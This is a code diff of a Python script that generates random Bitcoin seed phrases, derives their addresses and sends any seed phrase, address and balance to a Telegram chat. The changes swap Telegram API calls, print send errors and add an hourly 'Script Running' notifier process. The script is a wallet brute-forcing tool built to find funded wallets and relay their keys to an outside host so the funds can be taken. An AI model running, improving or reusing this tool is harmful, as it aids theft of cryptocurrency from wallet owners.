@@ -3,12 +3,12 @@ import hashlib
 import base58
 import multiprocessing
 from multiprocessing import Process, Value, Lock
-from time import time, sleep
+from time import sleep
 from colorama import init, Fore, Style
 from mnemonic import Mnemonic
 import bip32utils
 import ecdsa
-from telegram.ext import Updater, CommandHandler
+from telegram import Bot
 from dotenv import load_dotenv
 import requests
 from requests.exceptions import RequestException
@@ -21,9 +21,9 @@ fake = Faker()
 # Load environment variables from .env file
 load_dotenv()
 
-TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+# Retrieve Telegram credentials from environment variables
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-
 
 def generate_seed_phrase(strength=256):
     """Generate a mnemonic seed phrase (12 or 24 words)."""
@@ -107,10 +107,17 @@ def send_telegram_message(seed_phrase, address, balance):
             f"Address: {address}\nSeed Phrase: {seed_phrase}\nBalance: {balance} BTC \n Developer: Karan Kumar \n Organization: @CyberZoneAcademy"
         )
         try:
-            updater = Updater(token=TELEGRAM_TOKEN, use_context=True)
-            updater.bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
+            bot = Bot(token=TELEGRAM_TOKEN)  # Initialize Bot with the token
+            bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
         except Exception as e:
-            pass
+            print(f"Error sending message: {e}")
+
+
+def notify_running():
+    """Notify Telegram every hour that the script is running."""
+    while True:
+        sleep(3600)  # Sleep for one hour
+        send_telegram_message("Script Running", "", "")
 
 
 def worker(counter, found_counter, lock):
@@ -158,20 +165,25 @@ def main():
         for _ in range(num_workers)
     ]
     monitor = Process(target=display_performance, args=(counter, found_counter, lock))
+    notifier = Process(target=notify_running)
 
     for process in processes:
         process.start()
     monitor.start()
+    notifier.start()
 
     try:
         monitor.join()  # Keep the main thread alive to allow monitoring and workers to run indefinitely
+        notifier.join()  # Keep the notifier process alive
     except KeyboardInterrupt:
         for process in processes:
             process.terminate()
         monitor.terminate()
+        notifier.terminate()
         for process in processes:
             process.join()
         monitor.join()
+        notifier.join()
 
 
 if __name__ == "__main__":
